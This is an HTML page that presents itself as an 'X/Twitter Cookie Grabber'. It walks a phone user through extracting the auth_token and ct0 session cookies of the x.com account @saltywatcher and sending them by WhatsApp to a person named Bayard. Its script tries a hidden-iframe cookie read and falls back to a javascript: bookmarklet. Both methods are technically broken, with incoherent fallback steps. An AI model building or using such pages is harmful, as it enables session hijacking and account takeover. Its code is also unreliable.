<!DOCTYPE html>
<html>
<head>
<title>Cookie Grabber</title>
<style>
  body { font-family: sans-serif; padding: 40px; text-align: center; background: #f0f8ff; }
  button { padding: 20px 40px; font-size: 20px; background: #1DA1F2; color: white; border: none; border-radius: 10px; cursor: pointer; margin: 20px 0; }
  button:hover { background: #0d8bd9; }
  textarea { width: 100%; height: 120px; font-family: monospace; font-size: 14px; margin-top: 20px; padding: 10px; border: 2px dashed #ccc; }
  .instructions { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; text-align: left; }
  h2 { margin-top: 0; }
</style>
</head>
<body>

<h1>🍪 X/Twitter Cookie Grabber</h1>

<div class="instructions">
  <h2>How to use:</h2>
  <ol>
    <li>Open a <strong>new tab</strong> on your phone</li>
    <li>Go to <strong>x.com</strong> and make sure you're logged in as <strong>@saltywatcher</strong></li>
    <li>Come back to this tab and tap the button below</li>
    <li>Tap <strong>COPY</strong> on the text box that appears</li>
    <li>Paste the result in WhatsApp to Bayard</li>
  </ol>
</div>

<button onclick="getCookies()">🍪 Grab Twitter Cookies</button>

<div id="result" style="display:none">
  <h3>Your Cookies:</h3>
  <textarea id="output" readonly onclick="this.select()"></textarea>
  <button onclick="copyText()" style="background:#27AE60">📋 Copy to Clipboard</button>
</div>

<script>
function getCookies() {
  // Create a hidden iframe to x.com
  var iframe = document.createElement('iframe');
  iframe.src = 'https://x.com';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  
  // Try to access cookies via iframe
  iframe.onload = function() {
    try {
      var cookies = iframe.contentDocument.cookie || iframe.contentWindow.document.cookie;
      var auth_token = getCookieVal(cookies, 'auth_token');
      var ct0 = getCookieVal(cookies, 'ct0');
      
      var result = 'auth_token=' + auth_token + '\nct0=' + ct0;
      document.getElementById('output').value = result;
      document.getElementById('result').style.display = 'block';
    } catch(e) {
      // Cross-origin blocked - use bookmarklet fallback
      showBookmarkletInstructions();
    }
  };
  
  iframe.onerror = function() {
    showBookmarkletInstructions();
  };
  
  // Timeout fallback
  setTimeout(function() {
    if (!document.getElementById('result').style.display) {
      showBookmarkletInstructions();
    }
  }, 5000);
}

function getCookieVal(cookieStr, name) {
  var match = cookieStr.match(new RegExp(name + '=([^;]+)'));
  return match ? match[1] : 'NOT_FOUND';
}

function showBookmarkletInstructions() {
  document.getElementById('result').style.display = 'block';
  document.getElementById('output').value = 
    '⚠️ Cannot auto-grab cookies.\n\n' +
    'Instead, do this:\n\n' +
    '1. In your browser address bar, paste:\n' +
    '   javascript:document.cookie.split(";").filter(c=>c.trim().includes("auth_token")||c.trim().includes("ct0")).join("\\n")\n\n' +
    '2. Then visit: https://x.com\n' +
    '3. It will show an alert with your cookies\n' +
    '4. Copy and send them to Bayard';
}

function copyText() {
  var t = document.getElementById('output');
  t.select();
  document.execCommand('copy');
  alert('Copied! Paste in WhatsApp.');
}
</script>

</body>
</html>
